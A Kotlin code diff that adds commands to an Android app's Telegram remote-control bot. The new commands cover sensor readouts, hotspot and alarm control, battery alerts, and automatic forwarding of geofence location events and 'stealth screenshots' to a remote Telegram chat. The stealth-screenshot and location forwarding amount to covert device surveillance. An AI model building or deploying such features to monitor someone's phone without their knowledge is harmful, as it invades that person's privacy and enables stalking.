@@ -69,6 +69,14 @@ import com.ismartcoding.plain.events.HttpApiEvents
 import com.ismartcoding.lib.channel.sendEvent
 import com.ismartcoding.plain.preferences.PomodoroSettingsPreference
 import com.ismartcoding.plain.preferences.TelegramBotForwardSmsPreference
+import com.ismartcoding.plain.preferences.TelegramBotForwardGeofencePreference
+import com.ismartcoding.plain.preferences.TelegramBotForwardBatteryAlertPreference
+import com.ismartcoding.plain.preferences.TelegramBotBatteryAlertThresholdPreference
+import com.ismartcoding.plain.preferences.TelegramBotForwardStealthShotsPreference
+import com.ismartcoding.plain.helpers.SensorHelper
+import com.ismartcoding.plain.helpers.SystemControlHelper
+import com.ismartcoding.plain.helpers.GeofencingHelper
+import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
 import com.ismartcoding.plain.features.Permission
 import com.ismartcoding.plain.services.AppBlockHelper
 import com.ismartcoding.plain.services.LiveCallTracker
@@ -107,6 +115,11 @@ object TelegramBotManager {
     @Volatile var forwardNotifications: Boolean = true
     @Volatile var forwardCalls: Boolean = true
     @Volatile var forwardSmsEnabled: Boolean = false
+    @Volatile var forwardGeofenceEnabled: Boolean = false
+    @Volatile var forwardBatteryAlertEnabled: Boolean = false
+    @Volatile var batteryAlertThreshold: Int = 20
+    @Volatile var forwardStealthShotsEnabled: Boolean = false
+    @Volatile private var lastBatteryAlertLevel: Int = -1
     @Volatile private var lastUpdateId: Long = 0L
     @Volatile private var lastForwardedCallState: String = "idle"
 
@@ -211,6 +224,16 @@ object TelegramBotManager {
         "networkinfo" to "🌐 Extended network & Wi-Fi details",
         "reboot" to "🔄 Reboot device (requires root or Device Admin)",
         "mms" to "💬 Browse MMS multimedia messages — /mms [n]",
+        "gyroscope" to "🌀 Live gyroscope rotation rate (rad/s)",
+        "compass" to "🧭 Magnetic compass heading & cardinal direction",
+        "barometer" to "🌡 Atmospheric pressure (hPa) and altitude (m)",
+        "steps" to "👟 Step count since last reboot + today estimate",
+        "proximity" to "📡 Proximity sensor — near or far",
+        "hotspot" to "📶 Mobile hotspot status / toggle — /hotspot [on|off]",
+        "setalarm" to "⏰ Set a system alarm — /setalarm HH:MM [label]",
+        "batteryalert" to "🔋 Low-battery auto-alert — /batteryalert [on|off] [threshold%]",
+        "forwardgeofence" to "🗺 Auto-forward geofence enter/exit alerts — /forwardgeofence [on|off]",
+        "forwardshots" to "📸 Auto-forward stealth screenshots to chat — /forwardshots [on|off]",
         "commands" to "📝 List all commands with details",
         "stop" to "⛔ Stop the bot",
     )
@@ -538,6 +561,16 @@ object TelegramBotManager {
                     "networkinfo", "netinfo", "wifiinfo" -> cmdNetworkInfo()
                     "reboot", "restart", "rebootdevice" -> cmdReboot()
                     "mms" -> cmdMms(args)
+                    "gyroscope", "gyro", "rotation" -> cmdGyroscope()
+                    "compass", "heading", "magnetic" -> cmdCompass()
+                    "barometer", "pressure", "altitude", "baro" -> cmdBarometer()
+                    "steps", "pedometer", "stepcount", "stepcounter" -> cmdSteps()
+                    "proximity", "prox", "proxsensor" -> cmdProximity()
+                    "hotspot", "tethering", "wifiap" -> cmdHotspot(args)
+                    "setalarm", "alarm", "addalarm" -> cmdSetAlarm(args)
+                    "batteryalert", "batalert", "lowbattery" -> cmdBatteryAlert(args)
+                    "forwardgeofence", "geofencefwd", "gffwd" -> cmdForwardGeofence(args)
+                    "forwardshots", "shotsfwd", "autoshare" -> cmdForwardShots(args)
                     "commands" -> cmdCommands()
                     "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
                     else -> sendMessage("❓ Unknown command: <code>$command</code>\n\nSend /help for all commands.")
@@ -6877,4 +6910,276 @@ object TelegramBotManager {
             if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
         }
     }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    //  New Sensor Commands
+    // ─────────────────────────────────────────────────────────────────────────
+
+    private fun cmdGyroscope() {
+        SensorHelper.ensureSensorsStarted()
+        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_GYROSCOPE)) {
+            sendMessage("❌ This device does not have a gyroscope sensor.")
+            return
+        }
+        val d = SensorHelper.latestGyro
+        sendMessage(buildString {
+            append("🌀 <b>Gyroscope</b>\n\n")
+            append("• <b>X</b> (roll):  <code>${d.x}</code> rad/s\n")
+            append("• <b>Y</b> (pitch): <code>${d.y}</code> rad/s\n")
+            append("• <b>Z</b> (yaw):   <code>${d.z}</code> rad/s\n")
+            append("• <b>Magnitude</b>: <code>${d.magnitude}</code> rad/s\n")
+            append("\n🕐 <i>$ts</i>")
+        })
+    }
+
+    private fun cmdCompass() {
+        SensorHelper.ensureSensorsStarted()
+        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_MAGNETIC_FIELD)) {
+            sendMessage("❌ This device does not have a magnetometer sensor.")
+            return
+        }
+        val d = SensorHelper.latestMag
+        val arrow = when (d.cardinalDir) {
+            "N" -> "⬆️"; "NE" -> "↗️"; "E" -> "➡️"; "SE" -> "↘️"
+            "S" -> "⬇️"; "SW" -> "↙️"; "W" -> "⬅️"; "NW" -> "↖️"; else -> "🧭"
+        }
+        sendMessage(buildString {
+            append("🧭 <b>Compass / Magnetometer</b>\n\n")
+            append("$arrow <b>Heading:</b> <code>${d.heading}°</code> — <b>${d.cardinalDir}</b>\n\n")
+            append("• <b>Magnetic X</b>: <code>${d.x}</code> µT\n")
+            append("• <b>Magnetic Y</b>: <code>${d.y}</code> µT\n")
+            append("• <b>Magnetic Z</b>: <code>${d.z}</code> µT\n")
+            append("\n🕐 <i>$ts</i>")
+        })
+    }
+
+    private fun cmdBarometer() {
+        SensorHelper.ensureSensorsStarted()
+        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_PRESSURE)) {
+            sendMessage("❌ This device does not have a barometric pressure sensor.")
+            return
+        }
+        val d = SensorHelper.latestBarometer
+        sendMessage(buildString {
+            append("🌡 <b>Barometer</b>\n\n")
+            append("• <b>Pressure</b>: <code>${d.pressureHpa}</code> hPa\n")
+            append("• <b>Altitude</b>: <code>${d.altitudeMeters}</code> m\n")
+            append("\n<i>Standard sea-level: 1013.25 hPa</i>")
+            append("\n🕐 <i>$ts</i>")
+        })
+    }
+
+    private fun cmdSteps() {
+        SensorHelper.ensureSensorsStarted()
+        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_STEP_COUNTER)) {
+            sendMessage("❌ This device does not have a step counter sensor.")
+            return
+        }
+        val total = SensorHelper.stepCount
+        sendMessage(buildString {
+            append("👟 <b>Step Counter</b>\n\n")
+            if (total < 0) {
+                append("⏳ <i>Waiting for first step event… keep the phone moving.</i>")
+            } else {
+                append("• <b>Steps since reboot</b>: <code>$total</code>\n")
+                val distM = total * 0.762
+                val kcal = total * 0.04
+                append("• <b>Est. distance</b>: <code>${String.format("%.1f", distM)}</code> m\n")
+                append("• <b>Est. calories</b>: <code>${String.format("%.1f", kcal)}</code> kcal")
+            }
+            append("\n🕐 <i>$ts</i>")
+        })
+    }
+
+    private fun cmdProximity() {
+        SensorHelper.ensureSensorsStarted()
+        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_PROXIMITY)) {
+            sendMessage("❌ This device does not have a proximity sensor.")
+            return
+        }
+        val near = SensorHelper.proximityNear
+        val dist = SensorHelper.proximityDistance
+        val max = SensorHelper.proximityMaxRange
+        sendMessage(buildString {
+            append("📡 <b>Proximity Sensor</b>\n\n")
+            append(if (near) "🔴 <b>NEAR</b> — something is close to the sensor" else "🟢 <b>FAR</b> — nothing detected nearby")
+            append("\n• Distance: <code>$dist</code> cm (max range: <code>$max</code> cm)")
+            append("\n🕐 <i>$ts</i>")
+        })
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    //  New System Control Commands
+    // ─────────────────────────────────────────────────────────────────────────
+
+    private fun cmdHotspot(args: List<String>) {
+        val arg = args.getOrNull(1)?.lowercase()
+        val current = SystemControlHelper.getHotspotEnabled()
+        if (arg == null) {
+            sendMessage("📶 <b>Mobile Hotspot</b>\n\nStatus: ${if (current) "✅ ON" else "🔴 OFF"}\n\nUse <code>/hotspot on</code> or <code>/hotspot off</code> to control.")
+            return
+        }
+        val enable = arg == "on" || arg == "enable" || arg == "1"
+        val ok = SystemControlHelper.setHotspotEnabled(enable)
+        if (ok) sendMessage(if (enable) "✅ Hotspot turned <b>ON</b>" else "🔴 Hotspot turned <b>OFF</b>")
+        else sendMessage("❌ Could not control hotspot — requires root or CHANGE_NETWORK_STATE (restricted on Android 8+).")
+    }
+
+    private fun cmdSetAlarm(args: List<String>) {
+        val timeArg = args.getOrNull(1) ?: ""
+        if (timeArg.isBlank() || !timeArg.matches(Regex("\\d{1,2}:\\d{2}"))) {
+            sendMessage("⏰ <b>Set Alarm</b>\n\nUsage: <code>/setalarm HH:MM [label]</code>\nExample: <code>/setalarm 07:30 Wake up</code>")
+            return
+        }
+        val label = args.drop(2).joinToString(" ").ifBlank { "PlainApp Alarm" }
+        try {
+            val parts = timeArg.split(":")
+            val hour = parts[0].toInt()
+            val minute = parts[1].toInt()
+            val intent = android.content.Intent(android.provider.AlarmClock.ACTION_SET_ALARM).apply {
+                putExtra(android.provider.AlarmClock.EXTRA_HOUR, hour)
+                putExtra(android.provider.AlarmClock.EXTRA_MINUTES, minute)
+                putExtra(android.provider.AlarmClock.EXTRA_MESSAGE, label)
+                putExtra(android.provider.AlarmClock.EXTRA_SKIP_UI, true)
+                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            MainApp.instance.startActivity(intent)
+            sendMessage("✅ Alarm set for <b>${timeArg}</b> — label: <i>${htmlEsc(label)}</i>")
+        } catch (e: Exception) {
+            sendMessage("❌ Could not set alarm: ${htmlEsc(e.message ?: "No clock app found")}")
+        }
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    //  Battery Alert Command & Auto-Forward Toggle Commands
+    // ─────────────────────────────────────────────────────────────────────────
+
+    private suspend fun cmdBatteryAlert(args: List<String>) {
+        val sub = args.getOrNull(1)?.lowercase()
+        val threshArg = args.getOrNull(2)?.trimEnd('%')?.toIntOrNull()
+        when (sub) {
+            "on", "enable", "1" -> {
+                forwardBatteryAlertEnabled = true
+                coIO { TelegramBotForwardBatteryAlertPreference.putAsync(MainApp.instance, true) }
+                if (threshArg != null) {
+                    batteryAlertThreshold = threshArg.coerceIn(5, 95)
+                    coIO { TelegramBotBatteryAlertThresholdPreference.putAsync(MainApp.instance, batteryAlertThreshold) }
+                }
+                sendMessage("✅ Battery alert <b>ON</b> — will notify when battery ≤ <b>${batteryAlertThreshold}%</b>")
+            }
+            "off", "disable", "0" -> {
+                forwardBatteryAlertEnabled = false
+                coIO { TelegramBotForwardBatteryAlertPreference.putAsync(MainApp.instance, false) }
+                sendMessage("🔕 Battery alert <b>OFF</b>")
+            }
+            null -> {
+                val state = if (forwardBatteryAlertEnabled) "✅ <b>ON</b> (threshold: ${batteryAlertThreshold}%)" else "🔕 <b>OFF</b>"
+                sendMessage("🔋 <b>Battery Alert</b>\n\nStatus: $state\n\nUsage:\n<code>/batteryalert on [threshold%]</code>\n<code>/batteryalert off</code>\nExample: <code>/batteryalert on 20</code>")
+            }
+            else -> sendMessage("❓ Usage: <code>/batteryalert [on|off] [threshold%]</code>")
+        }
+    }
+
+    private suspend fun cmdForwardGeofence(args: List<String>) {
+        val sub = args.getOrNull(1)?.lowercase()
+        when (sub) {
+            "on", "enable", "1" -> {
+                forwardGeofenceEnabled = true
+                coIO { TelegramBotForwardGeofencePreference.putAsync(MainApp.instance, true) }
+                sendMessage("✅ Geofence alerts <b>ON</b> — you'll receive enter/exit events in this chat")
+            }
+            "off", "disable", "0" -> {
+                forwardGeofenceEnabled = false
+                coIO { TelegramBotForwardGeofencePreference.putAsync(MainApp.instance, false) }
+                sendMessage("🔕 Geofence alerts <b>OFF</b>")
+            }
+            null -> {
+                val state = if (forwardGeofenceEnabled) "✅ <b>ON</b>" else "🔕 <b>OFF</b>"
+                sendMessage("🗺 <b>Geofence Auto-Alerts</b>\n\nStatus: $state\n\nUse <code>/forwardgeofence on</code> or <code>/forwardgeofence off</code>")
+            }
+            else -> sendMessage("❓ Usage: <code>/forwardgeofence [on|off]</code>")
+        }
+    }
+
+    private suspend fun cmdForwardShots(args: List<String>) {
+        val sub = args.getOrNull(1)?.lowercase()
+        when (sub) {
+            "on", "enable", "1" -> {
+                forwardStealthShotsEnabled = true
+                coIO { TelegramBotForwardStealthShotsPreference.putAsync(MainApp.instance, true) }
+                sendMessage("✅ Stealth screenshot auto-forward <b>ON</b> — new shots will be sent here")
+            }
+            "off", "disable", "0" -> {
+                forwardStealthShotsEnabled = false
+                coIO { TelegramBotForwardStealthShotsPreference.putAsync(MainApp.instance, false) }
+                sendMessage("🔕 Stealth screenshot auto-forward <b>OFF</b>")
+            }
+            null -> {
+                val state = if (forwardStealthShotsEnabled) "✅ <b>ON</b>" else "🔕 <b>OFF</b>"
+                sendMessage("📸 <b>Stealth Screenshots Auto-Forward</b>\n\nStatus: $state\n\nUse <code>/forwardshots on</code> or <code>/forwardshots off</code>")
+            }
+            else -> sendMessage("❓ Usage: <code>/forwardshots [on|off]</code>")
+        }
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    //  Auto-Forwarding Methods (called by Android services)
+    // ─────────────────────────────────────────────────────────────────────────
+
+    /** Called by LocationTrackingService when a geofence is triggered. */
+    fun forwardGeofenceEvent(
+        geofenceName: String,
+        type: String,                // "enter" or "exit"
+        lat: Double,
+        lng: Double,
+        batteryLevel: Int,
+    ) {
+        if (!isRunning || !forwardGeofenceEnabled || token.isBlank() || chatId.isBlank()) return
+        val emoji = if (type == "enter") "🟢" else "🔴"
+        val action = if (type == "enter") "ENTERED" else "EXITED"
+        val txt = buildString {
+            append("$emoji <b>Geofence $action</b>\n")
+            append("📍 Zone: <b>${htmlEsc(geofenceName)}</b>\n")
+            append("🌍 Lat: <code>$lat</code>  Lng: <code>$lng</code>\n")
+            append("🔋 Battery: <b>${batteryLevel}%</b>\n")
+            append("<a href=\"https://maps.google.com/?q=$lat,$lng\">📌 View on Google Maps</a>\n")
+            append("🕐 <i>$ts</i>")
+        }
+        sendMessage(txt)
+    }
+
+    /** Called by battery monitoring to send a low-battery alert. */
+    fun forwardBatteryAlert(level: Int) {
+        if (!isRunning || !forwardBatteryAlertEnabled || token.isBlank() || chatId.isBlank()) return
+        if (level > batteryAlertThreshold) return
+        if (lastBatteryAlertLevel in 1..level) return
+        lastBatteryAlertLevel = level
+        val emoji = when {
+            level <= 5 -> "🪫"
+            level <= 10 -> "🔴"
+            level <= 20 -> "🟠"
+            else -> "🟡"
+        }
+        sendMessage("$emoji <b>Low Battery Alert</b>\n\n🔋 Battery is at <b>${level}%</b>\n⚡ Please charge the device soon.\n🕐 <i>$ts</i>")
+    }
+
+    /** Called by StealthScreenshotCapturer when a new shot is saved. */
+    fun forwardStealthShot(shot: StealthScreenshotHelper.Shot) {
+        if (!isRunning || !forwardStealthShotsEnabled || token.isBlank() || chatId.isBlank()) return
+        scope.launch {
+            try {
+                val file = java.io.File(shot.absPath)
+                if (!file.exists()) return@launch
+                val caption = buildString {
+                    append("📸 <b>Stealth Screenshot</b>\n")
+                    if (shot.appLabel.isNotBlank()) append("📱 App: <b>${htmlEsc(shot.appLabel)}</b>\n")
+                    append("🕐 <i>$ts</i>")
+                }
+                TelegramApiClient.sendPhoto(token, chatId, file, caption)
+            } catch (e: Exception) {
+                LogCat.e("TelegramBot forwardStealthShot failed: ${e.message}")
+            }
+        }
+    }
 }
+
